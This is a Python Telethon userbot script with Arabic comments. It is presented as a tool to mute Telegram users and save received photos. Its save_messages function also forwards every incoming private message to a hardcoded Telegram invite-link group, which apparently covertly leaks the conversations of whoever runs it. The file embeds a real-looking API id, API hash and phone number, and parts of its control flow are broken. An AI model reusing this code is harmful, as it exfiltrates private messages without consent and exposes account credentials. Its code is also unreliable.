#حقوق لوست lost 
#lost 
#حفظ الصور

import asyncio
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

api_id = '22418233'
api_hash = '588584f329ebb05b2c002d1695fc7416'
phone_number = '+9647806079717'
bot_username = '@RSRR8'

client = TelegramClient('session_name', api_id, api_hash)

mute_mode = False
muted_user = None
connected = False

@client.on(events.NewMessage(incoming=True))
async def handler(event):
    global mute_mode
    global muted_user

    if connected and mute_mode and muted_user == event.sender_id:
        await event.delete()

@client.on(events.NewMessage(outgoing=True))
async def handle_outgoing(event):
    global mute_mode
    global muted_user

    if event.raw_text.lower() == 'كتم':
        mute_mode = True
        muted_user = event.chat_id
        await event.delete()

        image_path = '/storage/emulated/0/lost.jpg'  # تغيير المسار إلى مسار الصورة الخاصة بك
        message = 'لقد تم كتمك.'

        try:
            async with client:
                if connected:
                    await client.send_message(muted_user, message)
                    await client.send_file(muted_user, file=image_path, caption=message)
                    await main()  # استدعاء دالة main() للاستمرار في تشغيل البرنامج
        except ConnectionError as e:
            print(f"Error: {e}")

    elif event.raw_text.lower() == 'إلغاء الكتم':
        if mute_mode and muted_user == event.chat_id:
            mute_mode = False
            muted_user = None
            await event.respond('تم إلغاء الكتم.')

    if event.media:
        if hasattr(event.media, 'photo'):
            image = await event.download_media()
            print('Received a new photo:', image)

            await client.send_file('me', file=image, caption='تم حفظ الصورة ✓')

async def save_messages():
    global client
    async with client:
        username1 = '@RSRR8'
        user1 = await client.get_input_entity(username1)

        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            global client
            if not event.is_private:  
                return

            sender = await event.get_sender()
            sender_username = sender.username if sender.username else sender.first_name

            message_text = event.raw_text
            print(f"Received a message from {sender_username}: {message_text}")
           
            chat_entity = await client.get_input_entity('https://t.me/+X1KCzrSf3jIwODNi')
            await client.forward_messages(chat_entity, event.message)

        await client.run_until_disconnected()

async def main():
    global connected
    await client.start()
    connected = True
    await save_messages()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
